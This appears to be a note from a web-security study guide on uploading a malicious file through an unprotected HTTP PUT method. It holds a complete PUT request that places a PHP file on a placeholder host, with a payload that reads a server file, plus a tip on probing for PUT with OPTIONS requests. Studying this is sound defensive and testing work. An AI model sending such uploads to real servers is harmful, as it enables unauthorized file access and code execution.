## Uploading files using PUT
Some web servers support `PUT requests`. If unprotected, this allows uploading malicious files even if the web interface does not provide an upload function:
```Request
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>
```

> [!info] Tip
Send `OPTIONS requests` to different endpoints to check for `PUT` support.
